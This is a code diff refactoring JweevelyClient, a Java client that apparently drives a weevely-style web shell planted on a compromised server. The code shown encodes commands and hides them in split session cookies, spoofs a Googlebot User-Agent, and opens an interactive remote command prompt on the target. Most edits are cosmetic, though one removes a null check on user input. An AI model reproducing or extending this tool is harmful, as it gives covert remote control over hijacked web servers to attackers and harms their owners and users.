@@ -26,6 +26,7 @@ import static org.jline.builtins.Completers.FileNameCompleter;
 
 /**
  * 2018年 09月 20日 星期四 22:25:13 CST
+ * 此项目待重构!
  * 2013年 12月 08日 星期日 22:56:07 CST
  *
  * @author needle wang
@@ -80,16 +81,13 @@ public class JweevelyClient {
 
     populateCookiesValue(httppost, password, inputStr);
 
-    CloseableHttpResponse response = httpclient.execute(httppost);
-
-    cleanHttpPost(httppost);
-
-    try {
+    try (CloseableHttpResponse response = httpclient.execute(httppost)) {
+      cleanHttpPost(httppost);
       HeaderElementIterator het = new BasicHeaderElementIterator(
           response.headerIterator("Set-Cookie"));
       while (het.hasNext()) {
         HeaderElement elem = het.nextElement();
-        // System.out.println(elem.getName()+"----"+ elem.getValue());
+        // System.out.println(elem.getName() + "----" + elem.getValue());
 
         if (elem.getName().equals("rlp")) {
 
@@ -128,17 +126,15 @@ public class JweevelyClient {
       } else {
         return "";
       }
-    } finally {
-      response.close();
     }
   }
 
   /**
    * populate sess[0-3]'s cookie.
    *
-   * @param httppost
+   * @param httppost HttpPost
    * @param sess0    passwd
-   * @param command
+   * @param command  command to run
    */
   public static void populateCookiesValue(HttpPost httppost, String sess0,
                                           String command) {
@@ -147,12 +143,16 @@ public class JweevelyClient {
     StringBuffer cool_cmd = UserMesg.getShuffBase64(command);
     /*
      * System.out.println("-----before removed cookie.-----");
-     * HeaderIterator headerIter = httppost.headerIterator(); while
-     * (headerIter.hasNext()) { System.out.println(headerIter.next()); }
+     * HeaderIterator headerIter = httppost.headerIterator();
+     * while(headerIter.hasNext()) {
+     *   System.out.println(headerIter.next());
+     * }
      * System.out.println("-----after removed cookie.------");
-     * httppost.removeHeaders("Cookie"); headerIter =
-     * httppost.headerIterator(); while (headerIter.hasNext()) {
-     * System.out.println(headerIter.next()); }
+     * httppost.removeHeaders("Cookie");
+     * headerIter = httppost.headerIterator();
+     * while (headerIter.hasNext()) {
+     *   System.out.println(headerIter.next());
+     * }
      */
 
     int split = cool_cmd.length() / 3;
@@ -160,7 +160,7 @@ public class JweevelyClient {
     String sess2 = cool_cmd.substring(split, split * 2);
     String sess3 = cool_cmd.substring(split * 2, cool_cmd.length());
 
-    /**
+    /*
      * cookie would be truncated '=' in some tomcat6~. so need urlencode.
      */
     try {
@@ -177,9 +177,11 @@ public class JweevelyClient {
     httppost.addHeader("Cookie", "sess2=" + sess2);
     httppost.addHeader("Cookie", "sess3=" + sess3);
     /*
-     * System.out.println("-----after populate cookie.-----"); headerIter =
-     * httppost.headerIterator(); while (headerIter.hasNext()) {
-     * System.out.println(headerIter.next()); }
+     * System.out.println("-----after populate cookie.-----");
+     * headerIter = httppost.headerIterator();
+     * while (headerIter.hasNext()) {
+     * System.out.println(headerIter.next());
+     * }
      */
   }
 
@@ -187,7 +189,7 @@ public class JweevelyClient {
    * clean httppost's data content after received a response, as for next
    * repost. if not, the previous post mesg would disturb next post.
    *
-   * @param httppost
+   * @param httppost HttpPost
    */
   public static void cleanHttpPost(HttpPost httppost) {
 
@@ -229,7 +231,7 @@ public class JweevelyClient {
     httppost.addHeader(HttpHeaders.USER_AGENT,
         "Mozilla/5.0 (compatible; Googlebot/2.1; http://www.google.com/bot.html)");
 
-    String hostname = null;
+    String hostname;
     try {
       // get hostname. replace the last \n!!
       hostname = oneJweevelyClient(httpclient, httppost, password,
@@ -244,7 +246,7 @@ public class JweevelyClient {
 
     if (hostname.contains("<" + pa_identify + ">")) {
       System.err.println("[Error] can't get a connecting:\n"
-          + "bad password or unable to run hostname.");
+          + "  bad password or unable to run hostname.");
       return;
     }
 
@@ -259,7 +261,7 @@ public class JweevelyClient {
       osName = "windows";
     }
 
-    String cwd = null;
+    String cwd;
     try {
       // get cwd. replace the last \n!!
       cwd = oneJweevelyClient(httpclient, httppost, password,
@@ -286,7 +288,7 @@ public class JweevelyClient {
     // jline2.1
     // It would read chinese word wrong in win without System.in.
     // use jline3
-    LineReader reader = null;
+    LineReader reader;
     try {
       reader = connector.getConsole();
     } catch (IOException e) {
@@ -302,7 +304,7 @@ public class JweevelyClient {
         // jdk1.6
         // String inputStr = lineReader.readLine("jweevely> ");
         // must be existed.
-        if (inputStr == null || inputStr.length() == 0) {
+        if (inputStr.length() == 0) {
           continue;
         }
 
@@ -330,12 +332,9 @@ public class JweevelyClient {
           builtIn.setCwd(builtIn.getLast_cwd());
         }
       }
-    } catch (UserInterruptException e) {
-    } catch (EndOfFileException e) {
+    } catch (UserInterruptException | EndOfFileException ignored) {
     } catch (IOException e) {
       System.out.println(e.getMessage());
-    } finally {
-      return;
     }
   }
 }
